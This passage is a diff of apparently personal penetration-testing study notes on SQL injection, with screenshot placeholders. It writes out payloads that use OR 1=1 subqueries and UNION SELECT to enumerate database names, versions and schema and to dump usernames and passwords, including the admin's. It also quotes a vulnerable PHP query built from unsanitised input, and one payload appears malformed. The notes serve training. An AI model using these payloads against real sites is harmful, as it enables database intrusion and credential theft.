@@ -106,13 +106,61 @@ guest        guest
 If you can use a ' at the end and receive a response, you can interact with the database
 ![[Pasted image 20230930093732.png]]
 
+after finding the ' gets a response, you can use a cmd like this to find more information to interact further with it
+
+offsec' OR 1=1 == //
+
+![[Pasted image 20231001051716.png]]
+' or 1=1 in **(select @@version)** -- //   -----**This is where the query goes!**
+
+using a specific criteria will most likely provide you with the desired result
+```
+' or 1=1 in (SELECT password FROM users) -- //
+```
+
+![[Pasted image 20231001053044.png]]
+
+being more specific would give you the information you desire (e.g. admin password)
+```
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
+![[Pasted image 20231001053200.png]]
 
 
+### UNION BASE SQL ATTACKS
+some databases could be attacked using UNION SQL queries; The **UNION**[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/sql-injection-attacks/manual-sql-exploitation/union-based-payloads#fn1) keyword aids exploitation because it enables execution of an extra SELECT statement and provides the results in the same query, thus concatenating two queries into one statement. use this to see all the info for the users in the database
 
+```
+$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
+```
 
+![[Pasted image 20231001054044.png]]
 
+this could be use to determine the exact columns (if you get an error, you know you have exceeded the amount)
+![[Pasted image 20231001054147.png]]
 
+Use this command to enumerate the database. **use the % sign to retrieve ALL the information from the DB**
+```
+%' UNION SELECT database(), user(), @@version, null, null -- //
+```
 
+![[Pasted image 20231001054233.png]]
 
+this cmd will give you an exact query info about the user (**no % use in this query since we know the specific info we are looking for**)
+```
+' UNION SELECT null, null, database(), user(), @@version  -- //
+```
+![[Pasted image 20231001054619.png]]
 
+with this  cmd, we are attempting to enumerate the db
+```
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+```
+![[Pasted image 20231001054924.png]]
+with the next command, we are attempting to dump the user name, password and description
+```
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+![[Pasted image 20231001055033.png]]
 
+### BLIND SQL INJECTIONS
